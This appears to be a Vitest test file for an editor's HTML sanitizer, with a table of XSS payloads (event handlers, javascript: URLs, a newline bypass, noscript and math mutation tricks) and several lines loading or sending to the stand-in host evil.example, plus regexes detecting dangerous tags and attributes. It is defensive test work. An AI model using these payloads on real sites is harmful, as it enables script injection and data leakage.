/**
 * sanitizeHTML 的攻击载荷表。
 *
 * 它是粘贴 / 导入 / setContent 三条链路上唯一的清洗闸门，改白名单很容易
 * 顺手放过一个属性，却没有别的东西会因此变红。这里只断言「输出里不再有
 * 能执行的东西」，不锁具体清洗手段（删节点还是拆属性由实现决定）。
 */
// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import { sanitizeHTML } from '../../src/core/documentValidation'

const PAYLOADS = [
  ['事件属性', '<img src="https://a.example/x.png" onerror="alert(1)">'],
  ['javascript 链接', '<a href="javascript:alert(1)">点我</a>'],
  ['换行绕过的伪协议', '<a href="java\nscript:alert(1)">点我</a>'],
  ['SVG 内联事件', '<svg/onload=alert(1)></svg>'],
  ['iframe srcdoc', '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>'],
  ['style 里 @import', '<style>@import url(//evil.example/x.css);</style>'],
  ['style 属性里的 url()', '<div style="background-image:url(javascript:alert(1))">x</div>'],
  ['template 包裹', '<template><img src="x" onerror="alert(1)"></template>'],
  ['base 改写相对地址', '<base href="//evil.example/">'],
  ['object', '<object data="//evil.example/x.swf"></object>'],
  ['math 命名空间', '<math><mtext><script>alert(1)</script></mtext></math>'],
  ['表单伪造提交地址', '<form action="//evil.example/"><button formaction="//evil.example/">x</button></form>'],
  ['ping 外发', '<a href="https://a.example/" ping="//evil.example/">x</a>'],
  ['noscript 混淆', '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>'],
]

describe('sanitizeHTML 拒绝可执行输入', () => {
  it.each(PAYLOADS)('%s', (_name, payload) => {
    const html = sanitizeHTML(payload)
    expect(html).not.toMatch(/\son[a-z]+\s*=/i)
    expect(html).not.toMatch(/javascript:/i)
    expect(html).not.toMatch(/<(script|svg|iframe|object|embed|style|base|template|math)\b/i)
    expect(html).not.toMatch(/\s(ping|formaction|srcdoc|action)\s*=/i)
  })

  it('保留正文结构，只摘掉危险外壳', () => {
    const html = sanitizeHTML('<p><strong>粗体</strong><a href="https://a.example/" onclick="x()">链接</a></p><table><tbody><tr><td colspan="2" colwidth="120,180">格</td></tr></tbody></table><input type="checkbox" checked onclick="x()">')
    expect(html).toContain('<strong>粗体</strong>')
    expect(html).toContain('href="https://a.example/"')
    expect(html).toContain('rel="noopener noreferrer"')
    expect(html).toContain('colspan="2"')
    expect(html).toContain('colwidth="120,180"')
    expect(html).toContain('<input type="checkbox"')
    expect(html).toMatch(/<input[^>]*disabled/)
    expect(html).not.toMatch(/onclick/)
  })

  it('非字符串直接报错，不做静默兜底', () => {
    expect(() => sanitizeHTML(null)).toThrow()
  })
})
